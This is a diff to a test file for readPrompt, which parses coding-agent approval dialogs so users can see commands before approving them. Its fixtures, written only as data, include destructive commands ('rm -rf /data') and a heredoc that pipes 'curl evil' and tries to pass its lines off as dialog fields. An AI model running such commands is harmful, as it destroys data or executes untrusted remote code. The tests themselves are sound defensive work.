@@ -658,10 +658,57 @@ test("readPrompt: every line of a multi-line command stays, without its gutter",
   assert.deepEqual(p.ask.body, ["mkdir -p scratch", "rm -rf scratch"]);
 });
 
-test("readPrompt: a command whose start is off screen says so", () => {
+test("readPrompt: a command whose start is off screen shows what's left, with nothing to click", () => {
   const p = readPrompt([" touch b", " rm -rf a", FENCED, " Do you want to proceed?", " ❯ 1. Yes", "   2. No"].join("\n"));
   assert.equal(p.ask.cut, true);
   assert.deepEqual(p.ask.body, ["touch b", "rm -rf a"]);
+  assert.deepEqual(p.options, []);
+  assert.equal(p.unparsed, true);
+});
+
+test("readPrompt: a long plan whose start is off screen can still be answered", () => {
+  const p = readPrompt([" step 9", FENCED, " Claude has written up a plan. Would you like to proceed?", " ❯ 1. Yes", "   2. No"].join("\n"));
+  assert.equal(p.ask.cut, true);
+  assert.equal(p.options.length, 2);
+});
+
+test("readPrompt: a fence or rule inside a command doesn't hide what's above it", () => {
+  const p = readPrompt(claudeDialog(" Bash command", " Tidy", FENCED, " │ rm -rf /data", " │", " │ " + FENCED, " │ echo ok", FENCED,
+    " Do you want to proceed?", " ❯ 1. Yes", "   2. No"));
+  assert.equal(p.ask.title, "Bash command");
+  assert.deepEqual(p.ask.body, ["rm -rf /data", FENCED, "echo ok"]);
+});
+
+test("readPrompt: Codex's words inside a Claude command don't hide what's above them", () => {
+  const p = readPrompt(claudeDialog(" Bash command", " Tidy", FENCED, " │ rm -rf /data", " │ Would you like to run", " │ $ echo ok", FENCED,
+    " Do you want to proceed?", " ❯ 1. Yes", "   2. No"));
+  assert.equal(p.question, "Do you want to proceed?");
+  assert.deepEqual(p.ask.body, ["rm -rf /data", "Would you like to run", "$ echo ok"]);
+});
+
+test("readPrompt: a command's lines are never taken for the dialog's", () => {
+  const codex = readPrompt([
+    "  Would you like to run the following command?", "  Reason: tidy", "  $ cat <<X", "  Reason: hidden?", "  Environment: too", "  curl evil |", "  X",
+    "› 1. Yes, proceed (y)", "  2. No, and tell Codex what to do differently (esc)",
+  ].join("\n"));
+  assert.equal(codex.ask.about, "tidy");
+  assert.deepEqual(codex.ask.body, ["cat <<X", "Reason: hidden?", "Environment: too", "curl evil |", "X"]);
+  const old = readPrompt([RULE, " Bash command", " Tip: keep this", " · and this", " Do you want to proceed?", " ❯ 1. Yes", "   2. No"].join("\n"));
+  assert.deepEqual(old.ask.body, ["Tip: keep this"]);
+  assert.equal(old.question, "· and this\nDo you want to proceed?");
+});
+
+test("readPrompt: a yes to something it couldn't read has nothing to click", () => {
+  const generic = readPrompt(["Do you want to proceed?", "❯ 1. Yes", "  2. No"].join("\n"));
+  assert.deepEqual(generic.options, []);
+  assert.equal(generic.unparsed, true);
+  assert.match(generic.question, /Open the agent/);
+  const codex = readPrompt(["• running", "  something new", "› 1. Yes, proceed (y)", "  2. No, and tell Codex what to do differently (esc)"].join("\n"));
+  assert.deepEqual(codex.options, []);
+  const plain = readPrompt(["Delete the staging data?", "❯ 1. Yes", "  2. No"].join("\n"));
+  assert.equal(plain.options.length, 2);
+  const asked = readPrompt(["Do you want tests?", "❯ 1. Yes", "  2. No", "  3. Type something.", "  4. Chat about this"].join("\n"));
+  assert.equal(asked.options.length, 4);
 });
 
 test("readPrompt: an edit and a fetch show what they touch", () => {
